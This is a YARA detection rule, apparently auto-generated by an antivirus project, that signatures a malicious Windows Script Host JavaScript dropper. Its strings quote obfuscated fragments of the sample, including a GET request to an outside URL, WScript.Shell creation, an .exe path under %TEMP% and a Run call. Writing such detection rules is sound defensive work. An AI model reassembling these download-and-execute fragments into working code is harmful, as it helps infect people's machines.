rule sig_20160330_ce75301bde085eb60befe3b566641c95 {
  meta:
    description = "datamaliciousorder - file 20160330_ce75301bde085eb60befe3b566641c95.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "af152f4e4bff46f599c6ca0613fb02ff2c8cf2233ac0bf3215fea44413bd63b1"

  strings:
    $s1  = "_EA[_RS](\"GET\", \"http://bqsc.pt/c6ska\", false);" fullword ascii
    $s2  = "function _GG(_E, _QR){_M = _M * 1; return _E - _QR;};" fullword ascii
    $s3  = "var _VB = function _OG() {return WScript[_KY](\"WScript\"+\".Shell\");}(), _TK = 11;" fullword ascii
    $s4  = "if (_EA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _O(){return _G0 + \"\";};" fullword ascii
    $s6  = "function _G() {return _VB[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"4kHLk7c6DHcGeKTh.ex\" + \"e\";};" fullword ascii
    $s7  = "function _Z(_RV){_VB[\"Run\"](_RV, _M, _M);};" fullword ascii
    $s8  = "function _SD() {return ((_SL == true) && (_SL == _PY)) ? 1 : _M;};" fullword ascii
    $s9  = "function _K(){return 22;};" fullword ascii
    $s10 = " while (_BS){" fullword ascii
    $s11 = "function _V0()" fullword ascii
    $s12 = "function _V(_C) {var _VC = (1, 2, 3, 4, 5, _C); return _VC;};" fullword ascii
    $s13 = "return _GG(_XC, _AR);" fullword ascii
    $s14 = "var _NZ = new this[\"Date\"]();" fullword ascii
    $s15 = "function _K0(){return _KY;};" fullword ascii
    $s16 = "var _Q = false;" fullword ascii
    $s17 = "var _PY = false;" fullword ascii
    $s18 = "_PY = true; " fullword ascii
    $s19 = "_SL = true; " fullword ascii
    $s20 = "var _SL = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}